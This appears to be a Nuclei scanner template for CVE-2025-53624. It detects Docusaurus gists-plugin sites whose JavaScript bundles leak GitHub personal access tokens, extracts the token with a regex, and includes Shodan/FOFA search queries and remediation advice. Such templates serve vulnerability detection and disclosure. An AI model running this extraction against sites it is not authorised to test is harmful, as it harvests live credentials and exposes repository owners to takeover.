flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: js_file_url
    regex:
    - <script src="/(assets/js/main\.[^"]*\.js)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "docusaurus_locale")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- extractors:
  - group: 1
    name: github_token
    regex:
    - ',personalAccessToken:"([^"]*)"}'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "personalAccessToken")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{js_file_url}}'
id: CVE-2025-53624
info:
  author: darses
  classification:
    cve-id: CVE-2025-53624
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
    cvss-score: 8.6
    cwe-id: CWE-200
    epss-percentile: 0.87367
    epss-score: 0.03581
  description: 'The Docusaurus gists plugin adds a page to your Docusaurus instance,
    displaying all public gists of a GitHub user. docusaurus-plugin-content-gists
    versions prior to 4.0.0 are vulnerable to exposing GitHub Personal Access Tokens
    in production build artifacts when passed through plugin configuration options.
    The token, intended for build-time API access only, is inadvertently included
    in client-side JavaScript bundles, making it accessible to anyone who can view
    the website''s source code.

    '
  impact: 'A GitHub personal access token exposure vulnerability can grant an attacker
    unauthorized access to your repositories and organization resources, potentially
    leading to data exfiltration, code injection, and supply chain attacks.

    '
  metadata:
    fofa-query: body="Docusaurus"
    max-request: 2
    product: docusaurus_plugin_content_gists
    shodan-query: http.html:"Docusaurus"
    vendor: webbertakken
    verified: true
  name: Docusaurus Gists Plugin < 4.0.0 - GitHub Personal Access Token Exposure
  reference:
  - https://github.com/webbertakken/docusaurus-plugin-content-gists/commit/8d4230b82412edb215ddfa9e609d178510a5fe31
  - https://github.com/webbertakken/docusaurus-plugin-content-gists/security/advisories/GHSA-qf34-qpr4-5pph
  - https://nvd.nist.gov/vuln/detail/CVE-2025-53624
  remediation: 'Update docusaurus-plugin-content-gists to version 4.0.0+. Revoke access
    to the GitHub PAT that was used: https://github.com/settings/tokens.

    '
  severity: high
  tags: cve,cve2025,docusaurus,exposure,vuln
